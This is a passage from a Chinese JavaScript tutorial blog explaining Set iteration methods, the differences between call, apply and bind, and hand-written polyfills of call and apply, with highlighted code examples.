的成员。</li><li><code>clear()</code>：清除所有成员，没有返回值。</li></ul></li><li><p>遍历方法</p><ul><li><code>keys()</code>：返回键名的遍历器。</li><li><code>values()</code>：返回键值的遍历器。</li><li><code>entries()</code>：返回键值对的遍历器。</li><li><code>forEach()</code>：使用回调函数遍历每个成员。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// red</span></span><br><span class="line"><span class="comment">// green</span></span><br><span class="line"><span class="comment">// blue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// red</span></span><br><span class="line"><span class="comment">// green</span></span><br><span class="line"><span class="comment">// blue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ["red", "red"]</span></span><br><span class="line"><span class="comment">// ["green", "green"]</span></span><br><span class="line"><span class="comment">// ["blue", "blue"]</span></span><br><span class="line"></span><br><span class="line">set.forEach(<span class="function">(<span class="params">key, value</span>) =&gt;</span> <span class="built_in">console</span>.log(key + <span class="string">' : '</span> + value)); <span class="comment">// key = value</span></span><br><span class="line"><span class="comment">// red : red</span></span><br><span class="line"><span class="comment">// green : green</span></span><br><span class="line"><span class="comment">// blue : blue</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong> Set 和 Object 判断是否有某个Key的对比 </strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象的写法</span></span><br><span class="line"><span class="keyword">const</span> properties = &#123;</span><br><span class="line">  <span class="string">'width'</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">'height'</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (properties[someName]) &#123;</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set的写法</span></span><br><span class="line"><span class="keyword">const</span> properties = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">properties.add(<span class="string">'width'</span>);</span><br><span class="line">properties.add(<span class="string">'height'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (properties.has(someName)) &#123;</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><h2 id="call和apply的区别"><a href="#call和apply的区别" class="headerlink" title="call和apply的区别"></a>call和apply的区别</h2><p>本质：改变 <code>this</code> 的指向<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// apply()方法：调用一个对象的一个方法，用另一个对象替换当前对象。</span></span><br><span class="line"><span class="comment">// 例如：B.apply(A, arguments); 即A对象应用B对象的方法。</span></span><br><span class="line">func.apply(thisObj[, argArray]); <span class="comment">// 2个参数，参数2为数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// call()方法：调用一个对象的一个方法，用另一个对象替换当前对象。</span></span><br><span class="line"><span class="comment">// 例如：B.call(A, args1,args2); 即A对象调用B对象的方法。</span></span><br><span class="line">func.call(thisObj[, arg1[, arg2[, [, ...argN]]]]); <span class="comment">// 多个参数，其他参数为非数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1 thisObj 是可选的。在 func 函数运行时使用的 this 值。请注意，this 可能不是该方法看到的实际值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象(window)，原始值会被包装。</span></span><br></pre></td></tr></table></figure></p><p>1、举例用途1：获取数组中最大最小值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// apply会将参数2的数组装换成一个个的参数，如将下例中的[1, 2, 3, 4]转换成1, 2, 3, 4.</span></span><br><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]); <span class="comment">// 参数1可写成null、undefined、this、Math、window</span></span><br><span class="line"><span class="built_in">Math</span>.min.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br></pre></td></tr></table></figure></p><p>2、举例用途2：拼接数组<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>);</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>);</span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2); <span class="comment">// 返回数组长度 6</span></span><br><span class="line">arr1.push.apply(arr1, arr2); <span class="comment">// arr1: ["1", "2", "3", "4", "5", "6"], arr1对象调用Array的push方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面的等同于</span></span><br><span class="line">arr1.push(...arr2); <span class="comment">// ES6语法</span></span><br><span class="line">arr1.concat(arr2); <span class="comment">// ES5语法</span></span><br></pre></td></tr></table></figure></p><p>3、举例3：面试题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现一个log方法，传入不定的参数，内部打印出console.log()日志</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// arguments输出的是一个数组，...arguments等到的是不定参数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// es6</span></span><br><span class="line">  <span class="built_in">console</span>.log(...arguments);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// es5</span></span><br><span class="line">  <span class="comment">// let arr =  Array.prototype.slice.call(araguments)  // 这一句可有可无</span></span><br><span class="line">  <span class="built_in">console</span>.log.apply(<span class="built_in">console</span>, <span class="built_in">arguments</span>); <span class="comment">// 即console去调用console.log的方法，并传入参数arguments</span></span><br><span class="line">&#125;</span><br><span class="line">log(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><p>1.) <code>console.log</code> 挂载在 <code>window</code> 下<br>2.) <code>this</code> 的指向需要看上下文，一开始 <code>this</code> 指向 <code>window</code><br>3.) 使用 <code>apply</code> 将log方法中 <code>this</code> 指向 <code>widnow</code> 变成指向 <code>console</code><br>4.) 参数1本例中可以使用 <code>null</code>、<code>undefined</code>、<code>this</code>、<code>window</code>、<code>console</code>，他表示在 <code>console.log</code> 运行时的 <code>this</code> 指向</p><p>4、严格模式 + 非严格模式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"> a, b </span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span> )</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>1.) 严格模式下 <code>this</code> 指向 <code>undefined</code><br>2.) 非严格模式下 <code>this</code> 会被转成全局的 <code>window</code></p><hr><h2 id="call、apply、bind"><a href="#call、apply、bind" class="headerlink" title="call、apply、bind"></a>call、apply、bind</h2><blockquote><p>参考：<a href="https://www.cnblogs.com/zhg277245485/p/6559475.html" target="_blank" rel="noopener">博客园 call,apply,bind</a></p></blockquote><p><code>call</code> 、<code>apply</code> 和 <code>bind</code> 是 <code>Function</code> 对象自带的三个方法，都是为了改变函数体内部 <code>this</code> 的指向；<br><code>apply</code> 、 <code>call</code> 、<code>bind</code> 三者第一个参数都是 <code>this</code> 要指向的对象，也就是想指定的上下文；<br><code>apply</code> 、 <code>call</code> 、<code>bind</code> 三者都可以利用后续参数传参；<br><code>bind</code> 是返回对应 函数，需要手动调用；<code>apply</code> 、<code>call</code> 则是立即调用。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fruits</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">fruits.prototype = &#123;</span><br><span class="line">  color: <span class="string">'red'</span>,</span><br><span class="line">  say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'My color is '</span> + <span class="keyword">this</span>.color); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> apple = <span class="keyword">new</span> fruits;</span><br><span class="line">apple.say();   <span class="comment">// 此时方法里面的 this 指的是 fruits</span></span><br><span class="line"><span class="comment">// 结果： My color is red</span></span><br></pre></td></tr></table></figure><p>  如果我们有一个对象 <code>banana = {color : &#39;yellow&#39;}</code> ,我们不想重新定义 <code>say</code> 方法，那么我们可以通过 <code>call</code> 或 <code>apply</code> 来使用 <code>apple</code> 的 <code>say</code> 方法：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> banana = &#123;</span><br><span class="line">  color: <span class="string">'yellow'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">apple.say.call(banana); <span class="comment">// 此时的 this 的指向已经同过 call() 方法改变了，指向的是 banana</span></span><br><span class="line"><span class="comment">// 结果： My color is yellow</span></span><br><span class="line"></span><br><span class="line">apple.say.apply(banana); <span class="comment">// 此时的 this 的指向已经同过 apply() 方法改变了，指向的是 banana</span></span><br><span class="line"><span class="comment">// 结果： My color is yellow</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果参数传null</span></span><br><span class="line">apple.say.apply(<span class="literal">null</span>); <span class="comment">// 因为 null 是 window 下的，所以此时 this 指向了 window</span></span><br><span class="line"><span class="comment">// 结果： My color is undefined</span></span><br></pre></td></tr></table></figure></p><h3 id="call、apply传参"><a href="#call、apply传参" class="headerlink" title="call、apply传参"></a>call、apply传参</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> arr3 = [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>];</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'16'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种：</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.call(arr1, arr2); <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, [6, 7, 8, 9, 10]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种：</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2, arr3); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.call(arr1, arr2, arr3); <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1) <span class="comment">// [1, 2, 3, 4, 5, [6, 7, 8, 9, 10], [11, 12, 13, 14, 15]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种：</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, str);</span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// Uncaught TypeError: CreateListFromArrayLike called on non-object</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.call(arr1, str); <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, "21"]</span></span><br></pre></td></tr></table></figure><p>  <code>call</code> 参数可以传多个，从第二个参数开始，<code>call</code> 会把他们当成一个元素，和它们本身的类型无关，<code>call</code> 的参数都是事先就知道的<br>  <code>apply</code> 参数可以传两个，且第二个参数必须使用 <code>Array</code>，<code>apply</code> 的参数可以是不定的（第二个参数内不定）<br>  <code>call</code> 和 <code>apply</code> 唯一的区别就是参数不同， <code>call</code> 可以传多个参数，<code>apply</code> 只能传两个且第二个是数组</p><h3 id="bind方法"><a href="#bind方法" class="headerlink" title="bind方法"></a>bind方法</h3><p>  bind方法会创建一个新函数，称之为绑定函数。当调用这个绑定函数时，绑定函数会将创建它时传入 <code>bind()</code> 方法的第一个参数作为 <code>this</code>，传入 <code>bind()</code> 方法的第二个及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  x:<span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> func = bar.bind(foo); <span class="comment">// 将foo对象绑定给bar，此时this会指向foo. 但是用bind() 方法并不会立即执行，而是创建一个新函数，如果要直接调用的话，可以 bar.bind(foo)();</span></span><br><span class="line"></span><br><span class="line">func(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p><p>  在 <code>JavaScript</code> 中，多次使用 <code>bind()</code> 是无效的。<code>bind()</code> 的实现相当于在内部包了一个 <code>call</code> 或 <code>apply</code>，第二次 <code>bind()</code> 相当于再包住第一次 <code>bind()</code>，所有第二次以后的 <code>bind()</code> 是无法生效的。<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  x:<span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> sed = &#123;</span><br><span class="line">  x:<span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = bar.bind(foo).bind(sed); <span class="comment">// 使用两次bind()</span></span><br><span class="line">func(); <span class="comment">// 3 第二次以后的bind()是无效的</span></span><br></pre></td></tr></table></figure></p><h3 id="call、apply、bind异同"><a href="#call、apply、bind异同" class="headerlink" title="call、apply、bind异同"></a>call、apply、bind异同</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  x: <span class="number">5</span>,</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  getX: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.bind(obj)());  <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.call(obj));    <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.apply(obj));   <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="如何选用"><a href="#如何选用" class="headerlink" title="如何选用"></a>如何选用</h3><p>  如果不需要关心具体有多少参数传入函数，选用 <code>apply()</code>;<br>  如果确定函数可以接受多少个参数，并且想一目了然的知道形参和实参的的对应关系，选用 <code>call()</code>;<br>  如果不需要立即执行，将来手动调用时，选用 <code>bind()()</code>;</p><h3 id="手动模拟实现call、apply、bind"><a href="#手动模拟实现call、apply、bind" class="headerlink" title="手动模拟实现call、apply、bind"></a>手动模拟实现call、apply、bind</h3><blockquote><p>参考：<a href="https://www.jianshu.com/p/3b69fb0d4c2f" target="_blank" rel="noopener">简书 手动实现call, apply, bind</a></p></blockquote><ol><li><p>模拟前须知</p><p>首先我们知道，对象上的方法，在调用时，<code>this</code> 是指向对象的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;</span><br><span class="line">  fn:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">o.fn() <span class="comment">//  Object &#123;fn: function&#125;</span></span><br></pre></td></tr></table></figure><p>知道了这点，我们就可以实现改变 <code>this</code> 指向了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数原型上添加 myCall方法 来模拟call</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//我们要让传入的obj成为, 函数调用时的this值.</span></span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;  <span class="comment">//在obj上添加_fn_属性，值是this(要调用此方法的那个函数对象)。</span></span><br><span class="line">  obj._fn_();       <span class="comment">//在obj上调用函数,那函数的this值就是obj.</span></span><br><span class="line">  <span class="keyword">delete</span> obj._fn_; <span class="comment">// 再删除obj的_fn_属性,去除影响.</span></span><br><span class="line">  <span class="comment">//_fn_ 只是个属性名 你可以随意起名，但是要注意可能会覆盖obj上本来就有的属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> test = &#123;</span><br><span class="line">  name:<span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;</span><br><span class="line">  name:<span class="string">'o'</span>,</span><br><span class="line">  fn:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">o.fn() <span class="comment">// "o"</span></span><br><span class="line">o.fn.call(test) <span class="comment">// "test"</span></span><br><span class="line">o.fn.myCall(test) <span class="comment">// "test"</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>模拟call<br>2.1 es6</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params">obj, ...arg</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 传参检测</span></span><br><span class="line">  <span class="keyword">if</span>(obj === <span class="literal">null</span> || obj === <span class="literal">undefined</span>)&#123;</span><br><span class="line">    obj = <span class="built_in">window</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    obj = <span class="built_in">Object</span>(obj);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> val ;</span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">  val = obj._fn_(...arg);  <span class="comment">//不能直接return obj._fn_(...arg) 这样就不delete属性了</span></span><br><span class="line">  <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">let</span> test = &#123;</span><br><span class="line">  name: <span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;</span><br><span class="line">  name:<span class="string">'o'</span>,</span><br><span class="line">  fn: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name, ...arguments);  <span class="comment">//这里把参数显示一下</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.fn(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// "o" 1 2 3</span></span><br><span class="line">o.fn.call(test, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// "test" 1 2 3</span></span><br><span class="line">o.fn.myCall(test, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// "test" 1 2 3</span></span><br><span class="line"><span class="comment">// 没问题</span></span><br></pre></td></tr></table></figure><p>2.2 非es6</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg = [];</span><br><span class="line">  <span class="keyword">let</span> val ;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)&#123;</span><br><span class="line">    arg.push( <span class="string">'arguments['</span> + i + <span class="string">']'</span> ) ;</span><br><span class="line">  &#125;</span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">  val = <span class="built_in">eval</span>( <span class="string">'obj._fn_('</span> + arg + <span class="string">')'</span> ) </span><br><span class="line">  <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>模拟apply<br>3.1 es6 + myCall方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">obj, arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> args = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    args.push( arr[i] );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 其实直接 ...arr 传参也可以 但是效果就和aplly有微小差别了</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.myCall(obj, ...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.2 非es6 + myCall方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 